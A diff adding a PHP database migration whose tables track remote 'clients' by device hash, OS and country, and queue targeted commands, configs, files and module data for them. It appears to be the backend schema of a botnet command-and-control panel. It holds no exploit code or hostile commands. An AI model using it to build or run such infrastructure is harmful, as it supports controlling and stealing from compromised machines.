@@ -1,0 +1,310 @@
+<?php defined('SYSPATH') or die('No direct script access.');
+
+class Base extends Migration{
+
+    private $BIG_PRIMARY_KEY = 'big_primary_key';
+    private $CHARACTER = 'character';
+
+    public function up(){
+        /*
+         * Clients
+         */
+        $this->create_table('clients', [
+            'id' => [$this->BIG_PRIMARY_KEY],
+            'name' => ['character', 'length' => 512, 'null' => true],
+            'group' => ['character', 'length' => 64, 'null' => true],
+            'importance' => ['integer', 'default' => 0, 'null' => false],
+            'created_at' => ['datetime', 'default' => DB::expr('now()'), 'null' => false],
+            'logged_at' => ['datetime'],
+            'last_activity' => ['datetime'],
+            'id_low' => ['big_integer', 'null' => false],
+            'id_high' => ['big_integer'],
+            'ip' => $this->char(45),
+            'sys_ver' => $this->char(256),
+            'country' => $this->char(50),
+            'client_ver' => ['integer'],
+            'userdefined' => ['integer', 'default' => 0, 'null' => false],
+            'devhash_1' => ['big_integer', 'null' => false],
+            'devhash_2' => ['big_integer', 'null' => false],
+            'devhash_3' => ['big_integer', 'null' => false],
+            'devhash_4' => ['big_integer', 'null' => false],
+        ], false);
+        $this->run_query('CREATE UNIQUE INDEX clients_id_low_id_high_idx ON clients (id_low, id_high)');
+        $this->run_query('CREATE INDEX clients_group_idx ON clients ("group")');
+        $this->run_query('CREATE INDEX clients_devhash_1_devhash_2_devhash_3_devhash_4_idx ON clients (devhash_1, devhash_2, devhash_3, devhash_4)');
+        $this->run_query('ALTER TABLE clients ALTER COLUMN "ip" TYPE character varying(45)'); // ipv6 max lenght + index varchar_pattern_ops (see migrations)
+
+        /*
+         * Commands
+         * */
+        $this->create_table('commands', [
+            'id' => [$this->BIG_PRIMARY_KEY],
+            'params' => ['text'],
+            'incode' => ['integer'],
+            'client_id' => ['integer'],
+            'result_code' => $this->char(50),
+            'created_at' => ['datetime', 'default' => DB::expr('now()'), 'null' => false],
+            'resulted_at' => ['datetime'],
+        ], false);
+        $this->run_query('CREATE INDEX commands_client_id_resulted_at_id_idx ON commands (client_id, resulted_at, id)');
+
+        /*
+         * commands_idle
+         */
+        $this->create_table('commands_idle', [
+            'id' => [$this->BIG_PRIMARY_KEY],
+            'params' => ['text', 'null' => false],
+            'count' => ['integer', 'default' => 0, 'null' => false],
+            'sys_ver' => $this->char(255),
+            'group' => $this->char(512),
+            'importance_low' => ['integer', 'default' => (-100), 'null' => false],
+            'importance_high' => ['integer', 'default' => 100, 'null' => false],
+            'userdefined_low' => ['integer', 'default' => (-100), 'null' => false],
+            'userdefined_high' => ['integer', 'default' => 100, 'null' => false],
+            'country_1' => $this->char(5),
+            'country_2' => $this->char(5),
+            'country_3' => $this->char(5),
+            'country_4' => $this->char(5),
+            'country_5' => $this->char(5),
+            'country_6' => $this->char(5),
+            'country_7' => $this->char(5),
+            'incode' => ['integer', 'null' => false]
+        ], false);
+        $this->run_query('ALTER TABLE commands_idle ADD COLUMN group_include VARCHAR[]');
+        $this->run_query('ALTER TABLE commands_idle ADD COLUMN group_exclude VARCHAR[]');
+
+        /*
+         * commands_idle_applied
+         */
+        $this->create_table('commands_idle_applied', [
+            'client_id' => ['integer', 'null' => false],
+            'command_idle_id' => ['integer', 'null' => false],
+            'assigned_at' => ['datetime', 'default' => DB::expr('now()'), 'null' => false],
+            'command_id' => ['integer', 'null' => false],
+        ], false);
+
+        /*
+         * configs
+         */
+        $this->create_table('configs', [
+            'id' => [$this->BIG_PRIMARY_KEY],
+            'version' => ['integer', 'null' => false],
+            'data' => ['binary', 'null' => false],
+            'group' => $this->char(255),
+            'sys_ver' => $this->char(255),
+            'importance_low' => ['integer', 'default' => (-100), 'null' => false],
+            'importance_high' => ['integer', 'default' => 100, 'null' => false],
+            'userdefined_low' => ['integer', 'default' => (-100), 'null' => false],
+            'userdefined_high' => ['integer', 'default' => 100, 'null' => false],
+            'client_id' => ['integer'],
+            'created_at' => ['datetime', 'default' => DB::expr('now()'), 'null' => false],
+            'country' => $this->char(5),
+        ], false);
+        $this->run_query('CREATE INDEX configs_version_group_idx ON configs (version, "group")');
+        $this->run_query('CREATE INDEX configs_version_sys_ver_idx ON configs (version, sys_ver)');
+        $this->run_query('CREATE INDEX configs_version_importance_low_importance_high_idx ON configs (version, importance_low, importance_high)');
+        $this->run_query('CREATE INDEX configs_version_userdefined_low_userdefined_high_idx ON configs (version, userdefined_low, userdefined_high)');
+        $this->run_query('CREATE INDEX configs_version_client_id_idx ON configs (version, client_id)');
+        $this->run_query('CREATE INDEX configs_version_country_idx ON configs (version, country)');
+
+
+
+        /*
+         * files
+         */
+        $this->create_table('files', [
+            'id' => [$this->BIG_PRIMARY_KEY],
+            'group' => $this->char(50),
+            'country' => $this->char(50),
+            'sys_ver' => $this->char(50),
+            'importance_low' => ['integer', 'default' => (-100), 'null' => false],
+            'importance_high' => ['integer', 'default' => 100, 'null' => false],
+            'userdefined_low' => ['integer', 'default' => (-100), 'null' => false],
+            'userdefined_high' => ['integer', 'default' => 100, 'null' => false],
+            'client_id' => ['integer'],
+            'priority' => ['integer', 'null' => false],
+            'filename' => $this->char(255),
+            'data' => ['binary', 'null' => false],
+            'created_at' => ['datetime', 'default' => DB::expr('now()'), 'null' => false],
+        ], false);
+        $this->run_query('CREATE UNIQUE INDEX files_priority_key ON files (priority)');
+        $this->run_query('CREATE INDEX files_group_idx ON files (filename, "group", priority)');
+        $this->run_query('CREATE INDEX files_geo_idx ON files (filename, country, priority)');
+        $this->run_query('CREATE INDEX files_os_idx ON files (filename, sys_ver, priority)');
+        $this->run_query('CREATE INDEX files_importance_idx ON files (filename, importance_low, importance_high, priority)');
+        $this->run_query('CREATE INDEX files_userdefined_idx ON files (filename, userdefined_low, userdefined_high, priority)');
+        $this->run_query('CREATE INDEX files_client_id_idx ON files (filename, client_id, priority)');
+        $this->run_query('ALTER TABLE files ADD COLUMN group_include VARCHAR[]');
+        $this->run_query('ALTER TABLE files ADD COLUMN group_exclude VARCHAR[]');
+
+
+        /*
+         * links
+         */
+        $this->create_table('links', [
+            'id' => [$this->BIG_PRIMARY_KEY],
+            'url' => ['text', 'null' => false],
+            'expiry_at' => ['datetime', 'null' => false],
+            'created_at' => ['datetime', 'default' => DB::expr('now()'), 'null' => false],
+            'group' => $this->char(255),
+            'client_ver' => ['integer', 'default' => 0, 'null' => false],
+            'ip' => ['inet', 'default' => DB::expr("'0.0.0.0/0'::inet") , 'null' => false],
+            'country' => $this->char(10),
+            'sys_ver' => $this->char(255),
+            'importance_low' => ['integer', 'default' => (-100), 'null' => false],
+            'importance_high' => ['integer', 'default' => 100, 'null' => false],
+            'userdefined_low' => ['integer', 'default' => (-100), 'null' => false],
+            'userdefined_high' => ['integer', 'default' => 100, 'null' => false],
+            'client_id' => ['integer'],
+        ], false);
+
+
+        $this->run_query('CREATE INDEX links_expiry_at_group_idx ON links (expiry_at, "group")');
+        $this->run_query('CREATE INDEX links_expiry_at_country_idx ON links (expiry_at, country)');
+        $this->run_query('CREATE INDEX links_expiry_at_sys_ver_idx ON links (expiry_at, sys_ver)');
+        $this->run_query('CREATE INDEX links_expiry_at_importance_low_importance_high_idx ON links (expiry_at, importance_low, importance_high)');
+        $this->run_query('CREATE INDEX links_expiry_at_userdefined_low_userdefined_high_idx ON links (expiry_at, userdefined_low, userdefined_high)');
+        $this->run_query('CREATE INDEX links_expiry_at_client_id_idx ON links (expiry_at, client_id)');
+        $this->run_query('ALTER TABLE links ADD COLUMN group_include VARCHAR[]');
+        $this->run_query('ALTER TABLE links ADD COLUMN group_exclude VARCHAR[]');
+
+        /*
+         * importance_rules
+         */
+        $this->create_table('importance_rules', [
+            'id' => ['big_primary_key'],
+            'class' => $this->char(35),
+            'params' => $this->char(1024),
+        ], false);
+        $this->run_query('ALTER TABLE importance_rules ADD COLUMN "preplus" real DEFAULT 0 NOT NULL;');
+        $this->run_query('ALTER TABLE importance_rules ADD COLUMN "mul" real DEFAULT 1 NOT NULL;');
+        $this->run_query('ALTER TABLE importance_rules ADD COLUMN "postplus" real DEFAULT 0 NOT NULL;');
+
+        /*
+         * storage
+         */
+        $this->create_table('storage', [
+            'id' => [$this->BIG_PRIMARY_KEY],
+            'client_id' => ['integer', 'null' => false],
+            'updated_at' => ['datetime'],
+            'key' => $this->char(255),
+            'value' => ['text'],
+        ], false);
+        $this->run_query('CREATE INDEX storage_client_id_idx ON storage (client_id)');
+
+
+        /*
+         * clients_log
+         */
+        $this->create_table('clients_log', [
+            'client_id' => ['integer', 'null' => false],
+            'created_at' => ['datetime', 'default' => DB::expr('now()'), 'null' => false],
+            'type' => ['integer', 'null' => false],
+            'info' => ['text', 'null' => false],
+            'command' => $this->char(255),
+        ], false);
+        $this->run_query('CREATE INDEX clients_log_pkey ON clients_log (client_id, created_at)');
+
+        /*
+         * module_data
+         */
+        $this->create_table('module_data', [
+            'id' => [$this->BIG_PRIMARY_KEY],
+            'client_id' => ['integer', 'null' => false],
+            'name' => $this->char(64),
+            'created_at' => ['datetime', 'default' => DB::expr('now()'), 'null' => false],
+            'ctl' => $this->char(64),
+            'ctl_result' => $this->char(1024),
+            'aux_tag' => $this->char(128),
+            'data' => ['binary'],
+        ], false);
+        $this->run_query('CREATE INDEX "module_data_aux-tag_idx" ON module_data (aux_tag)');
+        $this->run_query('CREATE INDEX "module_data_client_id_idx" ON module_data (client_id)');
+        $this->run_query('CREATE INDEX "module_data_name_idx" ON module_data ("name")');
+
+        /*
+         * apikey
+         */
+        $this->create_table('apikey', [
+            'id' => [$this->BIG_PRIMARY_KEY],
+            'commands_allowed' => ['text'],
+            'ip' => ['text'],
+            'apikey' => $this->char(64),
+            'pass' => $this->char(255),
+        ], false);
+        $this->run_query('CREATE INDEX apikey_apikey_pass_idx ON apikey (apikey, pass)');
+
+        /*
+         * apilog
+         */
+        $this->create_table('apilog', [
+            'apikey' => $this->char(64),
+            'apikey_id' => ['integer'],
+            'ip' => $this->char(32),
+            'command' => $this->char(255),
+            'time' => ['datetime', 'null' => false],
+            'type' => $this->char(255),
+        ], false);
+
+
+        /*
+         * clients_events
+         */
+        $this->create_table('clients_events', [
+            'client_id' => ['integer'],
+            'created_at' => ['datetime', 'default' => DB::expr('now()'), 'null' => false],
+            'module' => $this->char(64),
+            'event' => $this->char(64),
+            'tag' => $this->char(128),
+            'info' => ['text'],
+        ],
+            false
+        );
+
+        $this->run_query('ALTER TABLE clients_events ADD COLUMN "data" bytea;');
+        $this->run_query('ALTER TABLE ONLY clients_events ADD CONSTRAINT clients_events_pkey PRIMARY KEY (client_id, created_at)');
+        $this->add_index('clients_events', 'clients_events_tag_created_at_idx', ['tag', 'created_at'], 'normal');
+
+        /*
+         * commands_event
+         */
+        $this->create_table('commands_event', [
+            'id' => ['primary_key'],
+            'incode' => ['integer'],
+            'params' => ['text'],
+            'module' => $this->char(64),
+            'event' => $this->char(64),
+            'info' => ['text'],
+            'interval' => ['integer'],
+        ], false);
+
+        $this->add_index('commands_event', 'commands_event_module_event_idx', ['module', 'event'], 'normal');
+    }
+
+    public function down(){
+        $tables = [
+            'clients',
+            'commands',
+            'commands_idle',
+            'commands_idle_applied',
+            'configs',
+            'files',
+            'links',
+            'storage',
+            'clients_log',
+            'module_data',
+            'apikey',
+            'apilog',
+            'clients_events',
+            'commands_event'
+        ];
+
+        foreach($tables as $t){
+            $this->drop_table($t);
+        }
+    }
+
+    private function char($length){
+        return [$this->CHARACTER, 'length' => $length];
+    }
+}
